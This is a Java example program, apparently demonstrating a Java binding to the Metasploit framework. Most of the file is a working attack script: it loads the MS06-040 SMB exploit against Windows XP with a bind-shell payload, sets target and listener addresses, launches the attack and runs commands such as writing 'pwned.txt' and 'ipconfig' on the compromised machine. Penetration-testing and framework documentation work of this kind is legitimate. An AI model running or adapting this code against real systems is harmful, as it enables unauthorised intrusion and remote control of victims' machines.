/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.metasploit.test;

import java.util.Map;
import java.util.Iterator;

import org.metasploit.simple.Console;

import org.metasploit.Metasploit;
import org.metasploit.framework.Framework;
import org.metasploit.framework.Exploit;
import org.metasploit.framework.Payload;
import org.metasploit.framework.Session;
import org.metasploit.framework.OptBase;

/**
 *
 * @author hughneale
 */
public class Example {

    public static void main(String args[]) throws Exception {

        Framework mfw = new Metasploit().Simple().Framework();

        mfw.banner(); // Print banner

        // Set payload and exploit
        // This example exploits an issue within XP SP0 SMB (CIFS).

        Exploit exp = mfw.exploits().create("windows/smb/ms06_040_netapi");
        Payload pay = mfw.payloads().create("windows/shell/bind_tcp");

        // Print details reguarding the exploit.

        System.out.println(exp.Name());
        System.out.println(exp.FullName());
        System.out.println(exp.ShortName());
        System.out.println(exp.Type());
        System.out.println(exp.RefName());
        System.out.println(exp.RankToH());
        System.out.println(exp.Compat());
        System.out.println(exp.Description());

        // Get a list of required options for the exploit to succeed.

        Map<String, OptBase> options = exp.Options();
        Iterator it = options.entrySet().iterator();

        // Iterate over them

        while (it.hasNext()) {

            Map.Entry entry = (Map.Entry) it.next();
            String name = (String) entry.getKey();
            OptBase option = (OptBase) entry.getValue();

            //System.out.println(name + "   " + option.Name());

            if(option.Required()) {
                if(!option.Advanced()) {
                    if(!option.Evasion()) {

                        // Print out only the absoluse required options.

                        System.out.println(name + "   " + option.Type());
                    }

                }
            }

        }

        // Set exploit options

        exp.set("RHOST", "10.0.0.210");
        exp.set("RPORT", 445);
        exp.set("LHOST", "10.0.0.213");
        exp.set("LPORT", 2356);

        // Check to see if the exploit will work. Note in this example the check
        // is not supported.

        long state = exp.check();

        if(state == Exploit.SAFE) {
            Console.out("The target is not exploitable.");
        } else if(state == Exploit.DETECTED) {
            Console.out("The target service is running, but could not be validated.");
        } else if(state == Exploit.APPEARS) {
            Console.out("The target appears to be vulnerable.");
        } else if(state == Exploit.VULNERABLE) {
            Console.out("The target is vulnerable.");
        } else if(state == Exploit.UNSUPPORTED) {
            Console.out("This exploit does not support check.");
        }

        // Create a session within the selected exploit and payload.

        Session session = mfw.exploits().create(exp, pay);

        // Deal with the success.

        if (session == null) {
            System.out.println("\t\tNo session hooked.");
        } else {
            System.out.println("\t\tSession hooked, ");
            System.out.println("\t\tSession , " + session.inspect());
            System.out.println("\t\tSession , " + session.tunnel_to_s());

            // Connect with session

            session.run_cmd("echo jruby + msf > pwned.txt"); // pops into System32
            session.run_cmd("ipconfig");

            System.out.println("reading ..");

            // Show what we got back

            session.shell_read(1000); // buffer
            //session.interact();

        }

        System.out.println("\t\t" + mfw.sessions().avaliable() + " session(s) avaliable.");

    }
}
